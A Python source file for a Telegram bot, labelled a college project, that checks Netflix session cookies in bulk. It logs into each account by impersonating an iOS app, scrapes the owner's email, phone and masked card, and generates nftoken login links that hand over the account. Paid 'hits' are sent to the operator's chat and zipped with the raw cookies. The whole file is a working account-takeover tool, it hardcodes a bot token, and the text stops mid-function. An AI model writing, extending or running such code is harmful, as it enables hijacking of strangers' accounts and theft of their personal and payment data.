"""
Netflix Bulk Cookie Checker – Telegram Bot
College Project by @BERLIN_IS_BERLIN

Supports:
  • Single cookie (text or .txt file)
  • Bulk: .zip / .rar / .7z / .tar.gz archive  → extract all .txt cookie files
  • Live status dashboard (Total / Hits / Bad / Free / Stop button)
  • Multi-threaded checking (5 threads by default)
  • Instant hit notifications with full account info + PC/MOBILE/TV buttons
"""

import asyncio
import html
import io
import json
import logging
import os
import re
import tarfile
import tempfile
import threading
import unicodedata
import urllib.parse
import zipfile
from datetime import datetime
from pathlib import Path

import requests
from urllib3.exceptions import InsecureRequestWarning

try:
    import rarfile
    # Automatically find UnRAR / WinRAR on Windows if not on PATH
    import shutil as _shutil
    if not _shutil.which("unrar"):
        for _candidate in [
            r"C:\Program Files\WinRAR\UnRAR.exe",
            r"C:\Program Files (x86)\WinRAR\UnRAR.exe",
            r"C:\Program Files\WinRAR\WinRAR.exe",
            r"C:\Program Files (x86)\WinRAR\WinRAR.exe",
        ]:
            if os.path.exists(_candidate):
                rarfile.UNRAR_TOOL = _candidate
                break
    _HAS_RAR = True
except ImportError:
    _HAS_RAR = False

try:
    import py7zr
    _HAS_7Z = True
except ImportError:
    _HAS_7Z = False

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CallbackQueryHandler,
    CommandHandler,
    MessageHandler,
    ContextTypes,
    filters,
)

# ──────────────────────────────────────────────────────────────────────────────
# CONFIG
# ──────────────────────────────────────────────────────────────────────────────

BOT_TOKEN    = os.getenv("TELEGRAM_BOT_TOKEN", "9064998411:AAF5ubwDH3W9Tt3Zx4crlJ4yC8-OKwDA3Yw")
CHECKED_BY   = "@BERLIN_IS_BERLIN"
BERLIN_IMG   = os.path.join(os.path.dirname(__file__), "BERLIN.png")
NUM_THREADS  = 15         # concurrent cookie checkers (higher = faster)
UPDATE_EVERY = 5          # refresh live status every N cookies

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# ──────────────────────────────────────────────────────────────────────────────
# COUNTRY FLAGS
# ──────────────────────────────────────────────────────────────────────────────

_FLAGS = {
    "IN":"🇮🇳","US":"🇺🇸","GB":"🇬🇧","UK":"🇬🇧","CA":"🇨🇦","AU":"🇦🇺",
    "DE":"🇩🇪","FR":"🇫🇷","JP":"🇯🇵","KR":"🇰🇷","BR":"🇧🇷","MX":"🇲🇽",
    "IT":"🇮🇹","ES":"🇪🇸","NL":"🇳🇱","SE":"🇸🇪","NO":"🇳🇴","DK":"🇩🇰",
    "FI":"🇫🇮","PL":"🇵🇱","TR":"🇹🇷","RU":"🇷🇺","AR":"🇦🇷","CO":"🇨🇴",
    "CL":"🇨🇱","PE":"🇵🇪","VN":"🇻🇳","TH":"🇹🇭","PH":"🇵🇭","MY":"🇲🇾",
    "SG":"🇸🇬","ID":"🇮🇩","PK":"🇵🇰","BD":"🇧🇩","NG":"🇳🇬","ZA":"🇿🇦",
    "EG":"🇪🇬","SA":"🇸🇦","AE":"🇦🇪","IL":"🇮🇱","PT":"🇵🇹","CZ":"🇨🇿",
    "HU":"🇭🇺","RO":"🇷🇴","AT":"🇦🇹","CH":"🇨🇭","BE":"🇧🇪","NZ":"🇳🇿",
}

def _flag(code: str) -> str:
    return _FLAGS.get((code or "").upper().strip(), "")


# ──────────────────────────────────────────────────────────────────────────────
# COOKIE PARSING
# ──────────────────────────────────────────────────────────────────────────────

_COOKIE_KEYS = ("NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent")


def _udecode(v: str) -> str:
    if isinstance(v, str) and "%" in v:
        try:
            return urllib.parse.unquote(v)
        except Exception:
            pass
    return v


def extract_cookie_dict(text: str) -> dict:
    out: dict = {}

    # Netscape (tab or space)
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        for sep in ("\t", None):
            parts = line.split(sep) if sep else line.split()
            if len(parts) >= 7 and parts[1].upper() in ("TRUE", "FALSE"):
                if parts[5]:
                    out[parts[5]] = _udecode(parts[6])
                break

    # JSON
    try:
        data = json.loads(text)
        if isinstance(data, list):
            for c in data:
                n, v = c.get("name"), c.get("value")
                if n in _COOKIE_KEYS and isinstance(v, str):
                    out[n] = _udecode(v)
        elif isinstance(data, dict):
            for k in _COOKIE_KEYS:
                v = data.get(k)
                if isinstance(v, str):
                    out[k] = _udecode(v)
            for c in data.get("cookies", []):
                n, v = c.get("name"), c.get("value")
                if n in _COOKIE_KEYS and isinstance(v, str):
                    out[n] = _udecode(v)
    except Exception:
        pass

    # Regex fallback
    for key in _COOKIE_KEYS:
        if key in out:
            continue
        m = re.search(rf"(?<!\w){re.escape(key)}=([^;,\s]+)", text)
        if m:
            out[key] = _udecode(m.group(1))

    return out


def parse_cookies_from_text(text: str) -> list[dict]:
    """
    Split a text blob into individual cookie entries.
    Supports:
      - One Netscape block per entry (each starting with .netflix.com lines)
      - Multiple JSON cookie objects
      - Multiple 'NetflixId=...' lines
    Returns list of cookie dicts.
    """
    results = []

    # Try full-text JSON first
    try:
        data = json.loads(text.strip())
        if isinstance(data, list) and data and isinstance(data[0], dict):
            # Could be a single array of cookies OR array of arrays
            if "name" in data[0]:
                # Single cookie set
                cd = extract_cookie_dict(text)
                if cd.get("NetflixId"):
                    return [cd]
            else:
                for block in data:
                    cd = extract_cookie_dict(json.dumps(block))
                    if cd.get("NetflixId"):
                        results.append(cd)
                if results:
                    return results
    except Exception:
        pass

    # Split by blank lines or "# Netscape" headers
    blocks = re.split(r"\n\s*\n", text.strip())
    for block in blocks:
        block = block.strip()
        if not block:
            continue
        cd = extract_cookie_dict(block)
        if cd.get("NetflixId"):
            results.append(cd)

    if not results:
        # Last resort: every NetflixId=... line is one cookie
        for m in re.finditer(r"NetflixId=([^\s;,]+)", text):
            results.append({"NetflixId": _udecode(m.group(1))})

    return results


# ──────────────────────────────────────────────────────────────────────────────
# ARCHIVE EXTRACTION
# ──────────────────────────────────────────────────────────────────────────────

def extract_txt_from_archive(file_bytes: bytes, filename: str) -> list[tuple[str, str]]:
    """
    Returns list of (filename, text_content) for every .txt file inside the archive.
    Supports .zip, .rar, .7z, .tar.gz / .tar.bz2 / .tgz
    """
    import shutil as _shutil
    fname = filename.lower()
    results = []

    def _read_txt(name: str, data: bytes):
        text = data.decode("utf-8", errors="ignore").strip()
        if text:
            results.append((name, text))

    # ── ZIP ──────────────────────────────────────────────────────────────────
    if fname.endswith(".zip"):
        with zipfile.ZipFile(io.BytesIO(file_bytes)) as zf:
            for info in zf.infolist():
                if info.filename.lower().endswith(".txt") and not info.is_dir():
                    _read_txt(info.filename, zf.read(info.filename))
        return results

    # ── RAR ──────────────────────────────────────────────────────────────────
    if fname.endswith(".rar"):
        if not _HAS_RAR:
            raise RuntimeError("rarfile library not installed.")
        if not _shutil.which(rarfile.UNRAR_TOOL):
            for _c in [
                r"C:\Program Files\WinRAR\UnRAR.exe",
                r"C:\Program Files (x86)\WinRAR\UnRAR.exe",
                r"C:\Program Files\WinRAR\WinRAR.exe",
            ]:
                if os.path.exists(_c):
                    rarfile.UNRAR_TOOL = _c
                    break

        # Write RAR to temp file, extract ALL to a temp dir in one shot
        tmp_dir = tempfile.mkdtemp()
        tmp_rar = os.path.join(tmp_dir, "input.rar")
        try:
            with open(tmp_rar, "wb") as fh:
                fh.write(file_bytes)
            with rarfile.RarFile(tmp_rar) as rf:
                # extractall = single subprocess call for all files
                rf.extractall(tmp_dir)
            # Walk extracted files
            for root, _dirs, files in os.walk(tmp_dir):
                for fn in files:
                    if fn.lower().endswith(".txt"):
                        full = os.path.join(root, fn)
                        with open(full, "rb") as fh:
                            _read_txt(fn, fh.read())
        finally:
            _shutil.rmtree(tmp_dir, ignore_errors=True)
        return results

    # ── 7Z ───────────────────────────────────────────────────────────────────
    if fname.endswith(".7z"):
        if not _HAS_7Z:
            raise RuntimeError("py7zr library not installed.")
        with tempfile.NamedTemporaryFile(delete=False, suffix=".7z") as tmp:
            tmp.write(file_bytes)
            tmp_path = tmp.name
        try:
            with py7zr.SevenZipFile(tmp_path, mode="r") as sz:
                all_files = sz.read()
                for name, bio in all_files.items():
                    if name.lower().endswith(".txt"):
                        _read_txt(name, bio.read())
        finally:
            os.unlink(tmp_path)
        return results

    # ── TAR ──────────────────────────────────────────────────────────────────
    if any(fname.endswith(x) for x in (".tar.gz", ".tgz", ".tar.bz2", ".tar")):
        with tarfile.open(fileobj=io.BytesIO(file_bytes)) as tf:
            for member in tf.getmembers():
                if member.name.lower().endswith(".txt") and member.isfile():
                    f = tf.extractfile(member)
                    if f:
                        _read_txt(member.name, f.read())
        return results

    raise RuntimeError(f"Unsupported archive format: {filename}")


# ──────────────────────────────────────────────────────────────────────────────
# ACCOUNT INFO EXTRACTION
# ──────────────────────────────────────────────────────────────────────────────

def _dn(value) -> str | None:
    if value is None:
        return None
    cleaned = html.unescape(str(value))
    for s, t in {"\\x20":" ","\\u00A0":" ","\\u00a0":" ","&nbsp;":" ","u00A0":" "}.items():
        cleaned = cleaned.replace(s, t)
    cleaned = cleaned.replace("\\/","/").replace('\\"','"').replace("\\n"," ").replace("\\t"," ")
    def _u(m):
        try: return chr(int(m.group(1),16))
        except: return m.group(0)
    for _ in range(3):
        prev = cleaned
        cleaned = re.sub(r"\\u([0-9a-fA-F]{4})", _u, cleaned)
        cleaned = re.sub(r"\\x([0-9a-fA-F]{2})", _u, cleaned)
        cleaned = re.sub(r"(?<!\w)u([0-9a-fA-F]{4})(?![0-9a-fA-F])", _u, cleaned)
        cleaned = cleaned.replace("\\\\","\\")
        if cleaned == prev: break
    cleaned = re.sub(r"\s+", " ", cleaned).strip()
    return cleaned or None


def _fm(text, patterns, flags=0):
    for p in patterns:
        m = re.search(p, text, flags)
        if m: return _dn(m.group(1))
    return None


def _bm(text, patterns):
    v = _fm(text, patterns, re.IGNORECASE)
    if v is None: return None
    lv = str(v).strip().lower()
    if lv in {"true","yes","1"}: return "Yes"
    if lv in {"false","no","0"}: return "No"
    return v


def _profiles(text):
    names = []
    for p in [r'"profileName"\s*:\s*"([^"]+)"',
              r'"profileName"\s*:\s*\{[^}]*"value"\s*:\s*"([^"]+)"']:
        for f in re.findall(p, text, re.DOTALL):
            d = _dn(f)
            if d and d not in names: names.append(d)
    for m in re.finditer(r'"__typename"\s*:\s*"Profile"', text):
        sn = text[m.start():m.start()+1200]
        nm = re.search(r'"name"\s*:\s*"([^"]+)"', sn)
        if nm:
            d = _dn(nm.group(1))
            if d and d not in names: names.append(d)
    return ", ".join(names) if names else None


def extract_account_info(page_html: str) -> dict:
    t = page_html
    info = {
        "accountName": _fm(t,[
            r'"accountOwnerName"\s*:\s*"([^"]+)"',
            r'"name"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"',
            r'"firstName"\s*:\s*"([^"]+)"',
            r'userInfo"\s*:\s*\{[^}]*"name"\s*:\s*"([^"]+)"',
        ]),
        "email":   _fm(t,[r'"emailAddress"\s*:\s*"([^"]+)"',r'"email"\s*:\s*"([^"]+)"',r'"loginId"\s*:\s*"([^"]+)"']),
        "country": _fm(t,[r'"currentCountry"\s*:\s*"([^"]+)"',r'"countryOfSignup"\s*:\s*"([^"]+)"',r'"countryOfSignUp"[^"]*"code"\s*:\s*"([^"]+)"']),
        "memberSince": _fm(t,[r'"memberSince"\s*:\s*"([^"]+)"']),
        "plan":    _fm(t,[r'"MemberPlan".*?"localizedPlanName".*?"value"\s*:\s*"([^"]+)"',
                          r'localizedPlanName\":\{\"fieldType\":\"String\",\"value\":\"([^"]+)"',
                          r'"currentPlan"[\s\S]*?"plan"[\s\S]*?"name"\s*:\s*"([^"]+)"',
                          r'"localizedPlanName"\s*:\s*"([^"]+)"',r'"planName"\s*:\s*"([^"]+)"']),
        "quality": _fm(t,[r'videoQuality":\{"fieldType":"String","value":"([^"]+)"',r'"videoQuality"\s*:\s*"([^"]+)"',r'"quality"\s*:\s*"([^"]+)"']),
        "maxStreams": _fm(t,[r'maxStreams\":\{\"fieldType\":\"Numeric\",\"value\":([^,}]+)',r'"maxStreams"\s*:\s*"?([^",}]+)"?']),
        "nextBilling": _fm(t,[r'"GrowthNextBillingDate".*?"date"\s*:\s*"([^"T]+)T',r'"nextBillingDate"\s*:\s*"([^"]+)"',r'"nextBilling".*?"value"\s*:\s*"([^"]+)"']),
        "payment": _fm(t,[r'"paymentMethod"\s*:\s*\{[^}]*"value"\s*:\s*"([^"]+)"',r'"paymentMethodType"\s*:\s*"([^"]+)"',r'"paymentType"\s*:\s*"([^"]+)"']),
        "maskedCard": _fm(t,[r'"__typename"\s*:\s*"GrowthCardPaymentMethod"[\s\S]*?"displayText"\s*:\s*"([^"]+)"',r'"lastFour"\s*:\s*"([^"]+)"',r'"creditCardLast4"\s*:\s*"([^"]+)"']),
        "planPrice": _fm(t,[
            r'"formattedPlanPrice"\s*:\s*"([^"]+)"',
            r'"formattedPrice"\s*:\s*"([^"]+)"',
            r'"planPriceDisplay"\s*:\s*"([^"]+)"',
            r'"displayPrice"\s*:\s*"([^"]+)"',
            r'"planPrice"[^}]+"value"\s*:\s*"([^"]+)"',
            r'"price"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"',
        ]),
        "phone":   _fm(t,[r'"phoneNumberDigits"[\s\S]*?"value"\s*:\s*"([^"]+)"',r'"phoneNumber"\s*:\s*"([^"]+)"']),
        "phoneVerified": _bm(t,[r'"phoneVerified"\s*:\s*(true|false)',r'"isPhoneVerified"\s*:\s*(true|false)']),
        "holdStatus": _bm(t,[r'"holdStatus"\s*:\s*(true|false)',r'"isUserOnHold"\s*:\s*(true|false)',r'"pastDue"\s*:\s*(true|false)']),
        "emailVerified": _bm(t,[
            r'"emailVerified"\s*:\s*(true|false)',
            r'"isEmailVerified"\s*:\s*(true|false)',
            r'"emailAddressVerified"\s*:\s*(true|false)',
            r'"contactEmailVerified"\s*:\s*(true|false)',
        ]),
        "membershipStatus": _fm(t,[r'"membershipStatus"\s*:\s*"([^"]+)"']),
        "showExtraMember": _bm(t,[r'"showExtraMemberSection"\s*:\s*(true|false)']),
        "profiles": _profiles(t),
    }

    ms = (info.get("membershipStatus") or "").lower()
    if "current" in ms:
        info["status"] = "Active ✅"
    elif any(x in ms for x in ("hold", "cancel", "past_due", "suspend")):
        info["status"] = "Inactive ❌"
    elif info.get("plan"):
        info["status"] = "Active ✅"
    elif info.get("email") or info.get("profiles"):
        # We got account data but membershipStatus missing — likely active
        info["status"] = "Active ✅"
    else:
        info["status"] = "Unknown ⚠️"

    pay  = info.get("payment") or ""
    card = info.get("maskedCard") or ""
    if card and re.fullmatch(r"\d{4}", card):
        info["paymentDisplay"] = f"{pay} - {card}".strip(" -") if pay else card
    else:
        info["paymentDisplay"] = pay or "UNKNOWN"

    ph = info.get("phone"); pv = info.get("phoneVerified")
    info["phoneDisplay"] = f"{ph} ({pv or 'Unknown'})" if ph else f"Unknown ({pv or 'No'})"

    code = (info.get("country") or "").upper().strip()
    info["countryDisplay"] = f"{code} {_flag(code)}".strip() if code else "Unknown"

    ms_raw = info.get("memberSince") or ""
    nums   = re.findall(r"\d+", ms_raw)
    if len(nums) >= 2:
        try:
            mo, yr = int(nums[0]), int(nums[-1])
            info["memberSinceDisplay"] = datetime(yr, mo, 1).strftime("%B %Y") if 1<=mo<=12 and 1900<=yr<=2100 else (ms_raw or "Unknown")
        except Exception: info["memberSinceDisplay"] = ms_raw or "Unknown"
    else: info["memberSinceDisplay"] = ms_raw or "Unknown"

    pf = info.get("profiles")
    info["profileCount"] = len([n for n in pf.split(", ") if n]) if pf else "Unknown"
    info["extraSlot"]    = info.get("showExtraMember") or "No"

    # If emailVerified not found but email exists, assume verified
    if not info.get("emailVerified") and info.get("email"):
        info["emailVerified"] = "Yes"

    return info


# ──────────────────────────────────────────────────────────────────────────────
# NETFLIX API CALLS
# ──────────────────────────────────────────────────────────────────────────────

_BROWSER_HDR = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Accept-Encoding": "identity",
    "Accept-Language": "en-US,en;q=0.9",
}

_NFTOKEN_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
_NFTOKEN_QP  = {
    "appVersion":"15.48.1",
    "config":'{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
    "device_type":"NFAPPL-02-",
    "esn":"NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom":"phone","iosVersion":"15.8.5","isTablet":"false","languages":"en-US","locale":"en-US",
    "maxDeviceWidth":"375","model":"saget","modelType":"IPHONE8-1","odpAware":"true",
    "path":'["account","token","default"]',"pathFormat":"graph","pixelDensity":"2.0",
    "progressive":"false","responseFormat":"json",
}
_NFTOKEN_HDR = {
    "User-Agent":"Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt":"1","x-netflix.request.client.user.guid":"A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid":"A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing":'{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version":"15.48.1","x-netflix.argo.translated":"true",
    "x-netflix.context.form-factor":"phone","x-netflix.context.sdk-version":"2012.4",
    "x-netflix.client.appversion":"15.48.1","x-netflix.context.max-device-width":"375",
    "x-netflix.context.ab-tests":"","x-netflix.tracing.cl.useractionid":"4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type":"argo",
    "x-netflix.client.ftl.esn":"NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales":"en-US","x-netflix.context.top-level-uuid":"90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.client.iosversion":"15.8.5","accept-language":"en-US;q=1","x-netflix.argo.abtests":"",
    "x-netflix.context.os-version":"15.8.5","x-netflix.request.client.context":'{"appState":"foreground"}',
    "x-netflix.context.ui-flavor":"argo","x-netflix.argo.nfnsm":"9","x-netflix.context.pixel-density":"2.0",
    "x-netflix.request.toplevel.uuid":"90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid":"Asia/Dhaka",
}


def _fetch_account_info(cookie_dict: dict) -> dict:
    session = requests.Session()
    session.cookies.update({k: v for k, v in cookie_dict.items() if v})

    # Primary: /account/membership
    info = {}
    try:
        resp = session.get(
            "https://www.netflix.com/account/membership",
            headers=_BROWSER_HDR, timeout=20, verify=False,
        )
        if resp.status_code == 200 and resp.text:
            info = extract_account_info(resp.text)
    except Exception:
        pass

    # Fallback: /YourAccount (older page, more fields sometimes)
    if not info.get("plan") or not info.get("email"):
        try:
            resp2 = session.get(
                "https://www.netflix.com/YourAccount",
                headers=_BROWSER_HDR, timeout=20, verify=False,
            )
            if resp2.status_code == 200 and resp2.text:
                info2 = extract_account_info(resp2.text)
                # Merge: prefer non-None values from primary, fill gaps from fallback
                for k, v in info2.items():
                    if v and not info.get(k):
                        info[k] = v
        except Exception:
            pass

    return info


def _fetch_nftoken(netflix_id: str) -> tuple:
    hdrs = dict(_NFTOKEN_HDR)
    hdrs["Cookie"] = f"NetflixId={netflix_id}"
    resp = requests.get(_NFTOKEN_URL, params=_NFTOKEN_QP, headers=hdrs, timeout=30, verify=False)
    resp.raise_for_status()
    data = resp.json()
    td = ((((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {})
    token   = td.get("token")
    expires = td.get("expires")
    if not token: raise ValueError("No token in API response.")
    if isinstance(expires, int) and len(str(expires)) == 13: expires //= 1000
    return token, expires


def _build_urls(token: str) -> dict:
    return {
        "pc":     f"https://www.netflix.com/browse?nftoken={token}",
        "mobile": f"https://www.netflix.com/unsupported?nftoken={token}",
        "tv":     f"https://www.netflix.com/tv9?nftoken={token}",
    }


def _check_one_cookie(cookie_dict: dict) -> dict:
    """
    Check a single cookie dict.
    Logic:
      - Fetch account info from /account/membership
      - Fetch nftoken from iOS API
      - If token fetch FAILS (HTTP 4xx)  → BAD  (expired/invalid cookie)
      - If token fetch SUCCEEDS:
          - Plan contains "free" / no plan found  → FREE  (don't send to user)
          - Plan found and not free               → HIT   (send to user)
    Returns: { "status": "hit"|"free"|"bad", "info": {...}, "token": str|None, "urls": {...}|None }
    """
    netflix_id = cookie_dict.get("NetflixId")
    if not netflix_id:
        return {"status": "bad", "info": {}, "token": None, "urls": None}

    # Step 1 — account info (best-effort, don't fail on errors)
    try:
        info = _fetch_account_info(cookie_dict)
    except Exception:
        info = {}

    # Step 2 — nftoken (this is the real validity check)
    try:
        token, _ = _fetch_nftoken(netflix_id)
    except Exception:
        # Any error means cookie is bad / expired
        return {"status": "bad", "info": info, "token": None, "urls": None}

    # Token succeeded → cookie is alive
    urls = _build_urls(token)

    # Step 3 — classify: free vs paid hit
    plan_raw  = (info.get("plan") or "").lower().strip()
    plan_free_keywords = ("free", "básico con anuncios", "standard with ads", "ads", "mobile")

    if plan_raw and not any(kw in plan_raw for kw in plan_free_keywords):
        # Paid plan confirmed → HIT (send to user)
        status = "hit"
    elif plan_raw and any(kw in plan_raw for kw in plan_free_keywords):
        # Free / ads plan → FREE (count only, don't send)
        status = "free"
    else:
        # No plan scraped at all — check membershipStatus
        ms = (info.get("membershipStatus") or "").lower()
        if "current" in ms:
            # membershipStatus says current but no plan name — count as hit
            status = "hit"
        else:
            # Cannot confirm plan → treat as free (count only, don't send)
            status = "free"

    # Fix status display field based on final result
    if status in ("hit", "free"):
        info["status"] = "Active ✅"
    else:
        info["status"] = "Inactive ❌"

    return {"status": status, "info": info, "token": token, "urls": urls}


# ──────────────────────────────────────────────────────────────────────────────
# FORMAT HIT MESSAGE
# ──────────────────────────────────────────────────────────────────────────────

def _v(val, fb="Unknown") -> str:
    return str(val).strip() if val else fb


def format_hit_message(info: dict) -> str:
    """Format exactly matching the reference layout."""
    pf_names = info.get("profiles") or ""
    pf_count = info.get("profileCount") or "?"
    profiles_line = f"Profiles ({pf_count}): {pf_names}" if pf_names else "Profiles: Unknown"

    return (
        "� NETFLIX PREMIUM ACCOUNT 🍪\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "👤 Account Details:\n"
        f"• Status: {_v(info.get('status'))}\n"
        f"• Email: {_v(info.get('email'))}\n"
        f"• Country: {_v(info.get('countryDisplay'))}\n"
        f"• Member Since: {_v(info.get('memberSinceDisplay'))}\n"
        f"• Plan: {_v(info.get('plan'))}\n"
        f"• Quality: {_v(info.get('quality'))}\n"
        f"• Next Billing: {_v(info.get('nextBilling'))}\n"
        f"• Payment: {_v(info.get('paymentDisplay'))}\n"
        f"• Phone: {_v(info.get('phoneDisplay'))}\n"
        f"• Streams: {_v(info.get('maxStreams'))}\n"
        f"• Hold Status: {_v(info.get('holdStatus'))}\n"
        f"• Extra Slot: {_v(info.get('extraSlot'))}\n"
        f"• Total Profiles: {_v(info.get('profileCount'))}\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "📣 Checked By: @BERLIN_IS_BERLIN"
    )


def hit_keyboard(urls: dict) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([[
        InlineKeyboardButton("🖥️  PC",    url=urls["pc"]),
        InlineKeyboardButton("📱 MOBILE", url=urls["mobile"]),
        InlineKeyboardButton("📺 TV",     url=urls["tv"]),
    ]])


# ──────────────────────────────────────────────────────────────────────────────
# LIVE STATUS KEYBOARD
# ──────────────────────────────────────────────────────────────────────────────

def status_keyboard(session_id: str, counters: dict, done: bool) -> InlineKeyboardMarkup:
    t = counters.get("total", 0)
    h = counters.get("hits",  0)
    b = counters.get("bad",   0)
    f = counters.get("free",  0)
    checked = h + b + f
    row1 = [
        InlineKeyboardButton(f"📋 Total: {t}",   callback_data="noop"),
        InlineKeyboardButton(f"✅ Hits: {h}",    callback_data="noop"),
        InlineKeyboardButton(f"❌ Bad: {b}",     callback_data="noop"),
    ]
    row2_left = [InlineKeyboardButton(f"🆓 Free: {f}", callback_data="noop")]
    if done:
        row2 = row2_left + [InlineKeyboardButton("✔️ Complete!", callback_data="noop")]
    else:
        row2 = row2_left + [InlineKeyboardButton("🛑 Stop Process", callback_data=f"stop_{session_id}")]
    return InlineKeyboardMarkup([row1, row2])


def status_text(filename: str, counters: dict, done: bool) -> str:
    checked = counters.get("hits",0) + counters.get("bad",0) + counters.get("free",0)
    total   = counters.get("total", 0)
    prog    = f"{checked}/{total}"
    line    = "Check complete!" if done else f"⚡ Checking... `{prog}`"
    return (
        f"📂 *{filename}*\n"
        f"{line}"
    )


# ──────────────────────────────────────────────────────────────────────────────
# BULK CHECKER SESSION
# ──────────────────────────────────────────────────────────────────────────────

# Global store: session_id -> { "stop": threading.Event, "counters": dict, "status_msg_id": int }
_sessions: dict = {}
_sessions_lock = threading.Lock()


def _build_hits_zip(hits_data: list[dict]) -> bytes | None:
    """
    Build a ZIP in memory.
    Structure:
      <PlanName>/cookie_1.txt
      <PlanName>/cookie_2.txt
      ...
    Each .txt file:
      - Account details block at top
      - Full raw Netscape cookie at bottom
    """
    if not hits_data:
        return None

    buf = io.BytesIO()
    plan_counters: dict = {}

    with zipfile.ZipFile(buf, mode="w", compression=zipfile.ZIP_DEFLATED) as zf:
        for hit in hits_data:
            info       = hit.get("info", {})
            cookie_raw = hit.get("cookie_raw", "")

            plan_raw  = (info.get("plan") or "Unknown").strip()
            plan_safe = re.sub(r'[\\/:*?"<>|]', "_", plan_raw) or "Unknown"

            plan_counters[plan_safe] = plan_counters.get(plan_safe, 0) + 1
            idx     = plan_counters[plan_safe]
            arcname = f"{plan_safe}/cookie_{idx}.txt"

            # Build file content: details header + cookie
            pf_names = info.get("profiles") or ""
            pf_count = info.get("profileCount") or "?"
            profiles_line = f"Profiles ({pf_count}): {pf_names}" if pf_names else "Profiles: Unknown"

            details = (
                f"NETFLIX HIT\n"
                f"{'='*50}\n"
                f"Name: {_v(info.get('accountName'))}\n"
                f"Email: {_v(info.get('email'))}\n"
                f"Country: {_v(info.get('country'))}\n"
                f"Plan: {_v(info.get('plan'))}\n"
                f"Member Since: {_v(info.get('memberSinceDisplay'))}\n"
                f"Next Billing: {_v(info.get('nextBilling'))}\n"
                f"Payment: {_v(info.get('paymentDisplay'))}\n"
                f"Phone: {_v(info.get('phone'))}\n"
                f"Quality: {_v(info.get('quality'))}\n"
                f"Streams: {_v(info.get('maxStreams'))}\n"
                f"Price: {_v(info.get('planPrice'))}\n"
                f"Hold Status: {_v(info.get('holdStatus'))}\n"
                f"Extra Member: {_v(info.get('extraSlot'))}\n"
                f"Email Verified: {_v(info.get('emailVerified'))}\n"
                f"Membership Status: {_v(info.get('membershipStatus'))}\n"
                f"{profiles_line}\n"
                f"Telegram: @BERLIN_IS_BERLIN\n"
                f"\n{'='*50}\n"
                f"Netflix COOKIE:\n\n"
                f"{cookie_raw}\n"
            )
            zf.writestr(arcname, details)

    return buf.getvalue()


def _cookie_dict_to_netscape(cookie_dict: dict) -> str:
    """Reconstruct a Netscape cookie line from a cookie dict."""
    lines = ["# Netscape HTTP Cookie File"]
    for name, value in cookie_dict.items():
        if name in ("NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent") and value:
            lines.append(f".netflix.com\tTRUE\t/\tTRUE\t2147483647\t{name}\t{value}")
    return "\n".join(lines)


def _run_bulk_check(
    session_id: str,
    cookies_list: list[dict],
    filename: str,
    chat_id: int,
    status_msg_id: int,
    main_loop,   # the main asyncio loop from the bot
    app,         # telegram Application
):
    with _sessions_lock:
        sess = _sessions.get(session_id)
    if not sess:
        return

    stop_event = sess["stop"]
    counters   = sess["counters"]
    counters["total"] = len(cookies_list)

    # ── helpers that schedule coroutines on the MAIN bot loop ────────────────
    def _schedule(coro):
        """Submit coro to the main loop and WAIT for it to finish."""
        fut = asyncio.run_coroutine_threadsafe(coro, main_loop)
        try:
            fut.result(timeout=30)
        except Exception as e:
            logger.debug("_schedule error: %s", e)

    async def _edit_status(done=False):
        try:
            await app.bot.edit_message_text(
                chat_id=chat_id,
                message_id=status_msg_id,
                text=status_text(filename, counters, done),
                parse_mode="Markdown",
                reply_markup=status_keyboard(session_id, counters, done),
            )
        except Exception:
            pass

    async def _send_hit_msg(info: dict, urls: dict):
        try:
            await app.bot.send_message(
                chat_id=chat_id,
                text=format_hit_message(info),
                reply_markup=hit_keyboard(urls),
            )
        except Exception as e:
            logger.debug("send_hit error: %s", e)

